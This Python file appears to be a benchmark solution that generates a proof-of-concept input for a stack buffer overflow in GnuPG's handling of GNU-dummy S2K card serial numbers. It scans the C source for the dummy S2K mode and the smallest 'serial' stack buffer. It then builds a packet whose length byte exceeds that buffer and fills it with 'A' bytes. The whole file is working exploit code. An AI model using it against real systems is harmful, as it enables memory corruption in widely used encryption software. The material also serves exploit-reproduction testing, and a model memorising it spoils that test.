import os
import re
import tarfile
from typing import Dict, Iterable, List, Optional, Tuple


class Solution:
    def _iter_source_texts(self, src_path: str, max_file_size: int = 2_000_000) -> Iterable[Tuple[str, str]]:
        if os.path.isdir(src_path):
            for root, _, files in os.walk(src_path):
                for fn in files:
                    if not (fn.endswith(".c") or fn.endswith(".h") or fn.endswith(".cc") or fn.endswith(".cpp")):
                        continue
                    path = os.path.join(root, fn)
                    try:
                        st = os.stat(path)
                        if st.st_size <= 0 or st.st_size > max_file_size:
                            continue
                        with open(path, "rb") as f:
                            data = f.read(max_file_size + 1)
                        if len(data) > max_file_size:
                            continue
                        text = data.decode("utf-8", errors="ignore")
                    except Exception:
                        continue
                    yield (path, text)
            return

        try:
            with tarfile.open(src_path, "r:*") as tf:
                for m in tf.getmembers():
                    if not m.isfile():
                        continue
                    name = m.name
                    if not (name.endswith(".c") or name.endswith(".h") or name.endswith(".cc") or name.endswith(".cpp")):
                        continue
                    if m.size <= 0 or m.size > max_file_size:
                        continue
                    try:
                        f = tf.extractfile(m)
                        if f is None:
                            continue
                        data = f.read(max_file_size + 1)
                        if len(data) > max_file_size:
                            continue
                        text = data.decode("utf-8", errors="ignore")
                    except Exception:
                        continue
                    yield (name, text)
        except Exception:
            return

    def _find_dummy_s2k_mode(self, texts: Iterable[Tuple[str, str]]) -> int:
        mode = None

        define_res = [
            re.compile(r'^\s*#\s*define\s+S2K_GNU_DUMMY\s+(\d+)\b', re.M),
            re.compile(r'^\s*#\s*define\s+GNUPG_S2K_GNU_DUMMY\s+(\d+)\b', re.M),
            re.compile(r'^\s*#\s*define\s+S2K_DUMMY\s+(\d+)\b', re.M),
            re.compile(r'^\s*#\s*define\s+GNUPG_S2K_DUMMY\s+(\d+)\b', re.M),
        ]
        case_res = [
            re.compile(r'case\s+(\d+)\s*:\s*/\*[^*]*GNU[^*]*dummy[^*]*S2K', re.I),
            re.compile(r'case\s+(\d+)\s*:\s*/\*[^*]*dummy[^*]*S2K[^*]*GNU', re.I),
            re.compile(r'case\s+(\d+)\s*:\s*/\*[^*]*S2K[^*]*dummy[^*]*GNU', re.I),
        ]
        for _, t in texts:
            if "S2K" not in t and "s2k" not in t:
                continue
            for rx in define_res:
                m = rx.search(t)
                if m:
                    try:
                        v = int(m.group(1))
                        if 0 <= v <= 255:
                            mode = v
                            return mode
                    except Exception:
                        pass
            if mode is None and ("dummy" in t.lower() and "gnu" in t):
                for rx in case_res:
                    m = rx.search(t)
                    if m:
                        try:
                            v = int(m.group(1))
                            if 0 <= v <= 255:
                                mode = v
                                return mode
                        except Exception:
                            pass

        return mode if mode is not None else 101

    def _find_min_serial_stack_buf(self, texts: Iterable[Tuple[str, str]]) -> Optional[int]:
        min_sz = None
        decl_re = re.compile(r'\bchar\s+([A-Za-z_]\w*serial\w*)\s*\[\s*(\d+)\s*\]', re.I)
        for _, t in texts:
            tl = t.lower()
            if "serial" not in tl:
                continue
            if ("s2k" not in tl) and ("gnu" not in tl) and ("card" not in tl) and ("openpgp" not in tl):
                continue
            for m in decl_re.finditer(t):
                try:
                    sz = int(m.group(2))
                except Exception:
                    continue
                if sz <= 0 or sz > 4096:
                    continue
                if min_sz is None or sz < min_sz:
                    min_sz = sz
        return min_sz

    def _choose_printable_len_value(self, needed: int) -> int:
        allowed = list(range(ord("0"), ord("9") + 1)) + list(range(ord("A"), ord("F") + 1)) + list(range(ord("a"), ord("f") + 1))
        allowed.sort()
        for v in allowed:
            if v >= needed:
                return v
        return allowed[-1]

    def solve(self, src_path: str) -> bytes:
        texts_list = list(self._iter_source_texts(src_path))
        mode = self._find_dummy_s2k_mode(texts_list)
        min_buf = self._find_min_serial_stack_buf(texts_list)

        needed = 33
        if min_buf is not None:
            needed = max(needed, min_buf + 1)

        len_value = self._choose_printable_len_value(min(needed, 102))
        serial_len = len_value

        hash_algo = 2  # SHA1 commonly
        salt = b"GNU\x01\x00\x00\x00\x00"  # 8 bytes

        poc = bytes([mode & 0xFF, hash_algo & 0xFF]) + salt + bytes([len_value & 0xFF]) + (b"A" * serial_len) + b"\x00"
        return poc